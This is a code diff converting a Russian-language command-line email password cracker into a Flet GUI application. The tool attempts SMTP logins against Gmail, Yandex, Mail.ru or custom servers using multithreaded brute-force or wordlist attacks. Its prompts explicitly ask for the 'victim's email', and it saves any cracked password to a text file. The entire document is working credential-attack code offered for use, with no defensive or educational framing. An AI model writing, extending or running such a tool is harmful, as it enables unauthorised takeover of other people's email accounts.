@@ -1,110 +1,147 @@
+import flet as ft
 import smtplib
 import itertools
-import os
 from time import sleep
-from threading import *
-from colorama import init
-init()
+from threading import Thread
 
-print("         _                           ______           ")
-print("	| |                         (____  \             _   ")
-print("	| |      ____ _____ _   _    ____)  ) ____ _   _| |_ ")
-print("	| |     / _  (___  ) | | |  |  __  ( / ___) | | |  _)")
-print("	| |____( ( | |/ __/| |_| |  | |__)  ) |   | |_| | |_ ")  
-print("	|_______)_||_(_____)\__  |  |______/|_|    \____|\___)")
-print("	                   (____/                            ")
-																															  
-print		("\nЭта утилита для ленивого взлома паролей от почты.")
-print                    ("[+] Coded by Cat0dz [+]")
-print               ("[+] Переведенно на русский BITIW [+]")
-user = input("Введите почту жертвы: ")	
-protocol = "tls"
-if 'gmail' in user:
-    server = "gmail.com"
-    port = 587
-elif 'yandex' in user:
-    server = "yandex.ru"
-    port = 465
-    protocol = "ssl"
-elif 'mail' in user:
-    server = "mail.ru"
-    port = 465
-    protocol = "ssl"
+def connect_to_server(server, port, protocol):
+    smtpserver = None
+    if protocol == "ssl":
+        smtpserver = smtplib.SMTP_SSL(server, port)
+    elif protocol == "tls":
+        smtpserver = smtplib.SMTP(server, port)
+    smtpserver.ehlo()
+    return smtpserver
 
-print('\033[35m' +"Подключаюсь...")
-Kira = 0
-print('\033[37m')
-if protocol == "ssl":
- smtpserver_server = smtplib.SMTP_SSL("smtp."+server,port)
-elif protocol == "tls":
- smtpserver_server = smtplib.SMTP("smtp."+server,port)
-smtpserver_server.ehlo()
-smtpserver_server.ehlo()
-print("Подключён к серверу, готов к атаке.")
+def main(page: ft.Page):
+    page.title = "Email Brute Force"
+    page.theme_mode = "light"
 
-method = input("\nВыберите метод атаки => (a)Брутфорс (b)Список паролей : ")
-perf = input("\nВключть модификации для Raspberry PI?[y/n] : ")
-if perf == "y" or perf =="Y":
- Kira = 0.0002;
-if method == "a":
-    min_pass = int(input("Введите минимальный размер пароля(Обычно:8): "))
-    print ("\nВы собираетесь атаковать почту: "+'\033[43m'+user)
-    print('\033[37m')
-    verify2 = input ("Всё верно? [y/n]: ")
-    if verify2 == "y" or verify2 == "Y":
-        def print_perms(chars, minlen, maxlen): 
-            for n in range(minlen, maxlen+1): 
-                for perm in itertools.product(chars, repeat=n): 
-                    sleep(Kira)
-                    print(''.join(perm)) 
-            
-    print_perms ("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890!#$%&'*+-/=?^_`{|}~;", min_pass, 64)
+    def on_submit(e):
+        user = user_input.value
+        smtpserver = None
+        
+        if smtp_server.value == "Gmail":
+            smtpserver = connect_to_server("smtp.gmail.com", 587, "tls")
+        elif smtp_server.value == "Yandex":
+            smtpserver = connect_to_server("smtp.yandex.ru", 465, "ssl")
+        elif smtp_server.value == "Mail.ru":
+            smtpserver = connect_to_server("smtp.mail.ru", 465, "ssl")
+        elif smtp_server.value == "Custom":
+            custom_server = custom_server_input.value
+            custom_port = int(custom_port_input.value)
+            custom_protocol = custom_protocol_input.value.lower()
+            smtpserver = connect_to_server(custom_server, custom_port, custom_protocol)
+        
+        page.add(ft.Text("Connected to server, ready to attack.", color="green"))
 
-    for password in print_perms:
-        try:
-            smtpserver_server.login(user, password)
-            print (Fore.GREEN+"[+] Пароль подобран: "+Fore.GREEN+ password)
-            print('\033[39m')
-            input("Нажми ENTER что бы сохранить как txt .txt")
-            file = open("password cracked.txt","w")
-            file.write("Емейл: ")
-            file.write(user)
-            file.write("Пароль: ")
-            file.write(password)
-            file.close()
-            input("Пароль сохранен! Ищи <password cracked.txt> в папке с брутером")
-            break
-        except smtplib.SMTPAuthenticationError:
-            print ('\033[31m'+"[!] пароль неверен: "+'\033[32m'+ password)
-    if verify2 == "n" or verify2 == "N":   
-        quit()
+        thread_count = int(thread_count_input.value)
 
+        if attack_method.value == "Brute Force":
+            min_pass = int(min_pass_input.value)
+            start_brute_force_attack(smtpserver, user, min_pass, 0.0002 if pi_option.value else 0, thread_count)
+        elif attack_method.value == "Dictionary":
+            passwfile_path = dict_path_input.value
+            start_dictionary_attack(smtpserver, user, passwfile_path, thread_count)
 
-class Core1(Thread):
-     def run(self):
-        for password in passwfile:
-            try:
-                smtpserver_server.login(user, password)
-                print (Fore.GREEN+"[+] Пароль подобран: "+Fore.GREEN+ password)
-                print(Fore.GREEN)
-                input("Нажми ENTER что бы сохранить как txt .txt")
-                file = open("password cracked.txt","w")
-                file.write("Email: " + user)
-                file.write("Пароль: " + password)
-                file.close()
-                input(Fore.GREEN+"Пароль сохранен! Ищи <password cracked.txt> в папке с брутером")
-                t1.join()
-                t2.join()
-                break
-            except smtplib.SMTPAuthenticationError:
-                print ('\033[31m'+"[!] Incorrect Password: "+ password)
+    def start_brute_force_attack(smtpserver, user, min_pass, delay, thread_count):
+        def brute_force_thread(minlen, maxlen, delay):
+            for password in generate_passwords("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890!#$%&'*+-/=?^_`{|}~;", minlen, maxlen):
+                sleep(delay)
+                try:
+                    smtpserver.login(user, password)
+                    page.add(ft.Text(f"[+] Пароль подобран: {password}", color="green"))
+                    with open("password_cracked.txt", "w") as file:
+                        file.write(f"Емейл: {user}\nПароль: {password}\n")
+                    page.add(ft.Text("Пароль сохранен! Ищи <password_cracked.txt> в папке с брутером", color="blue"))
+                    return
+                except smtplib.SMTPAuthenticationError:
+                    page.add(ft.Text(f"[!] пароль неверен: {password}", color="red"))
 
-if method == "b":
-    passwfile = input("Введите путь до словаря: ")
-    passwfile = open(passwfile, "r")
-    reversedpasswfile = input("Введите ещё раз: ")
-    with open(reversedpasswfile) as f,  open('reversed_wordlist.txt', 'w') as fout:
-        fout.writelines(reversed(f.readlines()))
-    reversedpasswfile = open("reversed_wordlist.txt", "r")
-    t1 = Core1()
-    t1.start()
+        def generate_passwords(chars, minlen, maxlen):
+            for n in range(minlen, maxlen + 1):
+                for perm in itertools.product(chars, repeat=n):
+                    yield ''.join(perm)
+        
+        threads = []
+        for i in range(thread_count):
+            t = Thread(target=brute_force_thread, args=(min_pass, 64, delay))
+            threads.append(t)
+            t.start()
+        
+        for t in threads:
+            t.join()
+
+    def start_dictionary_attack(smtpserver, user, passwfile_path, thread_count):
+        with open(passwfile_path, "r") as passwfile:
+            passwords = passwfile.readlines()
+
+        def dictionary_thread(passwords):
+            for password in passwords:
+                password = password.strip()
+                try:
+                    smtpserver.login(user, password)
+                    page.add(ft.Text(f"[+] Пароль подобран: {password}", color="green"))
+                    with open("password_cracked.txt", "w") as file:
+                        file.write(f"Емейл: {user}\nПароль: {password}\n")
+                    page.add(ft.Text("Пароль сохранен! Ищи <password_cracked.txt> в папке с брутером", color="blue"))
+                    return
+                except smtplib.SMTPAuthenticationError:
+                    page.add(ft.Text(f"[!] пароль неверен: {password}", color="red"))
+
+        chunk_size = len(passwords) // thread_count
+        threads = []
+        for i in range(thread_count):
+            chunk = passwords[i*chunk_size:(i+1)*chunk_size]
+            t = Thread(target=dictionary_thread, args=(chunk,))
+            threads.append(t)
+            t.start()
+
+        for t in threads:
+            t.join()
+
+    def update_attack_options(e):
+        min_pass_input.visible = attack_method.value == "Brute Force"
+        dict_path_input.visible = attack_method.value == "Dictionary"
+        page.update()
+
+    def update_smtp_options(e):
+        custom_server_input.visible = smtp_server.value == "Custom"
+        custom_port_input.visible = smtp_server.value == "Custom"
+        custom_protocol_input.visible = smtp_server.value == "Custom"
+        page.update()
+
+    user_input = ft.TextField(label="Введите почту жертвы")
+    attack_method = ft.Dropdown(label="Метод атаки", options=[
+        ft.dropdown.Option("Brute Force"),
+        ft.dropdown.Option("Dictionary")
+    ], on_change=update_attack_options)
+    smtp_server = ft.Dropdown(label="SMTP сервер", options=[
+        ft.dropdown.Option("Gmail"),
+        ft.dropdown.Option("Yandex"),
+        ft.dropdown.Option("Mail.ru"),
+        ft.dropdown.Option("Custom")
+    ], on_change=update_smtp_options)
+    custom_server_input = ft.TextField(label="SMTP сервер (Custom)", visible=False)
+    custom_port_input = ft.TextField(label="Порт (Custom)", visible=False)
+    custom_protocol_input = ft.TextField(label="Протокол (tls/ssl)", visible=False)
+    min_pass_input = ft.TextField(label="Минимальный размер пароля", visible=False)
+    dict_path_input = ft.TextField(label="Путь до словаря", visible=False)
+    thread_count_input = ft.TextField(label="Количество потоков", value="1")
+    pi_option = ft.Checkbox(label="Включить модификации для Raspberry PI")
+
+    page.add(
+        user_input,
+        attack_method,
+        smtp_server,
+        custom_server_input,
+        custom_port_input,
+        custom_protocol_input,
+        min_pass_input,
+        dict_path_input,
+        thread_count_input,
+        pi_option,
+        ft.ElevatedButton("Начать атаку", on_click=on_submit)
+    )
+
+ft.app(target=main)
